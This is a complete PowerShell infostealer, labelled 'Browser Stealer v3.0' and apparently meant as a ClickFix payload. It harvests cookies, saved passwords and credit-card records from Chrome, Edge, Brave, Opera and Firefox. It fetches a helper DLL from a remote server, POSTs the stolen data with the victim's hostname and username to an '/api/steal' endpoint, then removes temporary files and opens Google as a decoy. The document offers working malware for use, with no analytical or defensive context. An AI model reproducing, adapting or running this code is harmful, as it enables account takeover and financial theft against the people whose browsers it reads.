# ============================================================
# BROWSER STEALER — FIXED (DLL + Fallback Parser)
# ============================================================

$ErrorActionPreference = "Continue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
$LOGFILE = "$env:TEMP\stealer_log.txt"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "  BROWSER STEALER v3.0"
Write-Log "  Target: $env:COMPUTERNAME"
Write-Log "  Log: $LOGFILE"
Write-Log "============================================"
Write-Log ""

# ============================================================
# TRY TO DOWNLOAD SQLITE DLL FROM YOUR SERVER
# ============================================================

$dllPath = "$env:TEMP\System.Data.SQLite.dll"
$sqliteLoaded = $false

# Clean up old DLL
if (Test-Path $dllPath) {
    Write-Log "[+] Removing old DLL"
    Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
}

Write-Log "[+] Attempting to download SQLite DLL from your server..."

$dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $webClient.DownloadFile($dllUrl, $dllPath)
    
    if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 50000) {
        Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
        
        # Try to load the DLL
        try {
            [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
            Write-Log "[+] SQLite loaded successfully!"
            $sqliteLoaded = $true
        } catch {
            Write-Log "[!] Failed to load DLL: $_"
            Write-Log "[+] Falling back to binary parser..."
        }
    } else {
        Write-Log "[!] DLL download failed or file too small"
        Write-Log "[+] Falling back to binary parser..."
    }
} catch {
    Write-Log "[!] Download failed: $_"
    Write-Log "[+] Falling back to binary parser..."
}

# ============================================================
# FALLBACK: PURE POWERSHELL BINARY PARSER (NO DLL REQUIRED)
# ============================================================

function Read-SQLite-Binary {
    param($DbPath)
    
    if (-not (Test-Path $DbPath)) { return $null }
    
    try {
        $bytes = [System.IO.File]::ReadAllBytes($DbPath)
        
        # Check SQLite header
        if ($bytes.Length -lt 20) { return $null }
        $header = [System.Text.Encoding]::ASCII.GetString($bytes[0..15])
        if (-not $header.StartsWith("SQLite format 3")) {
            return $null
        }
        
        # Extract all strings (null-terminated)
        $strings = @()
        $i = 0
        while ($i -lt $bytes.Length) {
            if ($bytes[$i] -eq 0) {
                $start = $i - 1
                while ($start -gt 0 -and $bytes[$start] -ne 0) { $start-- }
                $start++
                if ($i - $start -gt 1) {
                    try {
                        $str = [System.Text.Encoding]::UTF8.GetString($bytes[$start..($i-1)])
                        if ($str -match '[\w@.-]' -and $str.Length -gt 2 -and $str.Length -lt 500) {
                            $strings += $str
                        }
                    } catch {}
                }
            }
            $i++
        }
        return $strings
    } catch {
        return $null
    }
}

function Extract-Cookies {
    param($Strings, $BrowserName)
    $cookies = @()
    $hosts = @()
    $names = @()
    $values = @()
    
    foreach ($str in $Strings) {
        if ($str -match '([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})' -and $str -notmatch '[{}()\[\]]' -and $str.Length -lt 100) {
            $hosts += $str
        }
        if ($str -match '^[a-zA-Z0-9_-]{2,}$' -and $str -notmatch '^(host|name|value|path|expires|secure|httponly)$' -and $str.Length -lt 50) {
            $names += $str
        }
        if ($str.Length -gt 5 -and $str -match '[a-zA-Z0-9+/=_-]' -and $str -notmatch '^[a-z]+$') {
            $values += $str
        }
    }
    
    $max = [Math]::Min($hosts.Count, [Math]::Min($names.Count, $values.Count))
    for ($i = 0; $i -lt $max -and $i -lt 100; $i++) {
        if ($hosts[$i] -and $names[$i] -and $values[$i]) {
            $domain = $hosts[$i]
            $name = $names[$i]
            $value = $values[$i]
            if ($name -ne "host_key" -and $name -ne "name" -and $name -ne "value" -and $name -ne "path") {
                $cookies += @{
                    domain = $domain -replace '^\.', ''
                    name = $name
                    value = $value
                    browser = $BrowserName
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# COOKIE FUNCTIONS (DLL + Fallback)
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    
    if ($sqliteLoaded) {
        # Use SQLite DLL
        try {
            $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
            Copy-Item $Path $temp -Force
            
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT host_key, name, value FROM cookies"
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                if ($row['name'] -and $row['value']) {
                    $d = $row['host_key']
                    if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                    $cookies += @{ domain = $d; name = $row['name']; value = $row['value']; browser = $Name }
                }
            }
            $rdr.Close()
            $conn.Close()
            Remove-Item $temp -Force -ErrorAction SilentlyContinue
        } catch {}
    } else {
        # Use binary parser
        $strings = Read-SQLite-Binary -DbPath $Path
        if ($strings) {
            $cookies = Extract-Cookies -Strings $strings -BrowserName $Name
        }
    }
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                if ($sqliteLoaded) {
                    try {
                        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
                        Copy-Item $f $temp -Force
                        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
                        $conn.Open()
                        $cmd = $conn.CreateCommand()
                        $cmd.CommandText = "SELECT host, name, value FROM moz_cookies"
                        $rdr = $cmd.ExecuteReader()
                        while ($rdr.Read()) {
                            $row = @{}
                            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                                $n = $rdr.GetName($i)
                                $v = $rdr.GetValue($i)
                                if ($v -ne $null) { $row[$n] = $v }
                            }
                            if ($row['name'] -and $row['value']) {
                                $dmn = $row['host']
                                if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                                $cookies += @{ domain = $dmn; name = $row['name']; value = $row['value']; browser = "Firefox" }
                            }
                        }
                        $rdr.Close()
                        $conn.Close()
                        Remove-Item $temp -Force -ErrorAction SilentlyContinue
                    } catch {}
                } else {
                    $strings = Read-SQLite-Binary -DbPath $f
                    if ($strings) {
                        $cookies += Extract-Cookies -Strings $strings -BrowserName "Firefox"
                    }
                }
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD FUNCTIONS
# ============================================================

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    
    if ($sqliteLoaded) {
        try {
            $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
            Copy-Item $Path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                if ($row['username_value'] -and $row['password_value']) {
                    $u = $row['origin_url']
                    if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                    $pass += @{ url = $u; username = $row['username_value']; password = $row['password_value']; browser = $Name }
                }
            }
            $rdr.Close()
            $conn.Close()
            Remove-Item $temp -Force -ErrorAction SilentlyContinue
        } catch {}
    } else {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($Path)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            $lines = $text -split "`0"
            $url = ""; $user = ""; $passw = ""
            foreach ($line in $lines) {
                if ($line -match 'https?://([^/]+)') {
                    $url = $Matches[1]
                }
                if ($line -match 'username[_-]?value[^=]*=([^,]+)') {
                    $user = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                }
                if ($line -match 'password[_-]?value[^=]*=([^,]+)') {
                    $passw = $Matches[1] -replace '[^a-zA-Z0-9@._-]', ''
                }
                if ($url -and $user -and $passw -and $user.Length -gt 2 -and $passw.Length -gt 2) {
                    $pass += @{ url = $url; username = $user; password = $passw; browser = $Name }
                    $url = ""; $user = ""; $passw = ""
                }
            }
        } catch {}
    }
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname -replace 'https?://', ''
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

# ============================================================
# CARD FUNCTIONS
# ============================================================

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    
    if ($sqliteLoaded) {
        try {
            $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
            Copy-Item $Path $temp -Force
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                if ($row['name_on_card'] -and $row['card_number_encrypted']) {
                    $cards += @{
                        name = $row['name_on_card']
                        number = $row['card_number_encrypted']
                        month = $row['expiration_month']
                        year = $row['expiration_year']
                        browser = $Name
                    }
                }
            }
            $rdr.Close()
            $conn.Close()
            Remove-Item $temp -Force -ErrorAction SilentlyContinue
        } catch {}
    } else {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($Path)
            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
            $lines = $text -split "`0"
            $name = ""; $number = ""; $month = ""; $year = ""
            foreach ($line in $lines) {
                if ($line -match 'name[_-]?on[_-]?card[^=]*=([^,]+)') {
                    $name = $Matches[1]
                }
                if ($line -match 'card[_-]?number[_-]?encrypted[^=]*=([^,]+)') {
                    $number = $Matches[1]
                }
                if ($line -match 'expiration[_-]?month[^=]*=(\d+)') {
                    $month = $Matches[1]
                }
                if ($line -match 'expiration[_-]?year[^=]*=(\d+)') {
                    $year = $Matches[1]
                }
                if ($name -and $number -and $name.Length -gt 1 -and $number.Length -gt 5) {
                    $cards += @{ name = $name; number = $number; month = $month; year = $year; browser = $Name }
                    $name = ""; $number = ""; $month = ""; $year = ""
                }
            }
        } catch {}
    }
    return $cards
}

# ============================================================
# STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

Write-Log ""
Write-Log "[+] Chrome cookies..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "[+] Edge cookies..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "[+] Brave cookies..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "[+] Opera cookies..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "[+] Firefox cookies..."
$allCookies += Get-FirefoxCookies

Write-Log "[+] Chrome passwords..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "[+] Edge passwords..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "[+] Brave passwords..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "[+] Opera passwords..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Log "[+] Firefox passwords..."
$allPasswords += Get-FirefoxPasswords

Write-Log "[+] Chrome cards..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "[+] Edge cards..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "[+] Brave cards..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# SUMMARY
# ============================================================

Write-Log ""
Write-Log "============================================"
Write-Log "  SUMMARY"
Write-Log "============================================"
Write-Log "Cookies:    $($allCookies.Count)"
Write-Log "Passwords:  $($allPasswords.Count)"
Write-Log "Cards:      $($allCards.Count)"
Write-Log "============================================"
Write-Log ""

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Log "[!] No data stolen!"
    Write-Log "[*] Possible reasons:"
    Write-Log "  - No saved passwords/cookies in browsers"
    Write-Log "  - Browser is running (locks the database)"
    Write-Log "  - Close the browser and try again"
    Write-Log ""
}

# ============================================================
# BUILD PAYLOAD — INCLUDES PC NAME
# ============================================================

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $pcName
        username = $userName
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
}

# ============================================================
# SEND TO SERVER
# ============================================================

Write-Log "[+] Sending data to server..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "[+] Data sent successfully!"
} catch {
    Write-Log "[!] Failed to send: $_"
}

# ============================================================
# CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "[+] Done!"
Write-Log "[+] Log saved to: $LOGFILE"
Write-Log ""
Read-Host "Press Enter to exit"
